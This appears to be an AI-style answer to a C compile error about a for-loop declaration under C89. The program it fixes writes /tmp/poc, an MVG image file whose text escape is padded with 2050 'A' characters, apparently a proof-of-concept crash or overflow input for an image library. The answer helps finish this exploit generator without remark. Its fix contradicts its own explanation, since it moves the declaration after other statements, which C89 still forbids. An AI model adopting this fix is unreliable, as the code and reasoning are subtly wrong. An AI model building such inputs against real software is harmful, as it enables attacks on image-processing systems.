Senior Engineer Analysis:
The compiler error occurs because your code uses a **C99-style declaration inside the `for` loop** (`for (int i = 0; ...)`), but your compiler is likely set to **C89 (ANSI C) mode**, which does not allow declarations to appear inside a `for` statement’s initializer.

In C89, all variable declarations must be placed at the beginning of a block, before any statements. The `for (int i` syntax was introduced in C99. When the compiler sees `int` inside the `for`, it expects either an identifier (like a variable name) or a parenthesis, but the parser is confused because it doesn't expect a type there at all under C89 rules.

### ✅ Fix
Declare `i` before the loop:

```c
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    fprintf(f, "push graphic-context\n");
    fprintf(f, "text 0,0 '");
    fputc('%', f);
    fputc('[', f);
    int i;  // ← declare here
    for (i = 0; i < 2050; i++) fputc('A', f);
    fprintf(f, "]'\n");
    fprintf(f, "pop graphic-context\n");

    fclose(f);
    return 0;
}
```

Alternatively, tell your compiler to use C99 or later (e.g., `gcc -std=c99` or `-std=c11`), which would allow the original code to compile without changes.

